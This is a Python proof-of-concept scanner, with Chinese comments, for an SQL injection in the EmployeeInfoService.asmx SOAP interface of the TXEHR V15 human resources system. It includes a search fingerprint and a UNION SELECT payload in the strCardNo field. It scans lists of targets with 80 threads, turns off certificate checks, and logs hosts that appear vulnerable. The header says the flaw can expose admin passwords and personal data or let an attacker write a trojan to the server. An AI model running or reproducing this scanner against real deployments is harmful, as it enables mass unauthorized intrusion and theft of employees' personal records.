# 同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx SQL注入漏洞
# body="/Assistant/Default.aspx"
# 产品简介:同享人力资源管理系统（TXEHR V15）是一款专为现代企业设计的人力资源管理软件解决方案，旨在通过先进的信息化手段提升企业人力资源管理的效率与水平。该系统集成了组织人事、考勤管理、薪资核算、招聘配置、培训发展、绩效管理等核心模块，并提供了灵活的配置选项和强大的数据分析能力，以满足不同企业规模和行业特性的需求。
# 漏洞概述:同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx 接口多个实例处SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
        \x1b[38m████████╗██╗  ██╗███████╗██╗  ██╗██████╗       ██╗   ██╗ ██╗███████╗
        \x1b[36m╚══██╔══╝╚██╗██╔╝██╔════╝██║  ██║██╔══██╗      ██║   ██║███║██╔════╝
        \x1b[34m   ██║    ╚███╔╝ █████╗  ███████║██████╔╝█████╗██║   ██║╚██║███████╗
        \x1b[35m   ██║    ██╔██╗ ██╔══╝  ██╔══██║██╔══██╗╚════╝╚██╗ ██╔╝ ██║╚════██║
        \x1b[31m   ██║   ██╔╝ ██╗███████╗██║  ██║██║  ██║       ╚████╔╝  ██║███████║
        \x1b[33m   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝        ╚═══╝   ╚═╝╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
  --author:Kucei  --Version:同享人力资源管理系统-TXEHR V15 EmployeeInfoService.asmx SQL注入
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('同享人力资源管理系统-TXEHR-V15_EmployeeInfoService_asmx-SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/Service/EmployeeInfoService.asmx'
    headers = {
        'Content-Type': 'text/xml; charset=utf-8',
        'Content-Length': 'length',
        'SOAPAction': '"http://tempuri.org/GetEmployeeByCardNo"',
    }
    database = "1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
    data = f'''<?xml version="1.0" encoding="utf-8"?>\r\n<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n\r<soap:Body>\r\n\r\r<GetEmployeeByCardNo xmlns="http://tempuri.org/">\r\n\r\r\r<strCardNo>{database}</strCardNo>\r\n\r\r</GetEmployeeByCardNo>\r\n\r</soap:Body>\r\n</soap:Envelope>'''
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    try :
        response = requests.post(url=target+url_payload,headers=headers,json=data,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'SQL' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('TXEHR-V15_EmployeeInfoService_asmx-SQL.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()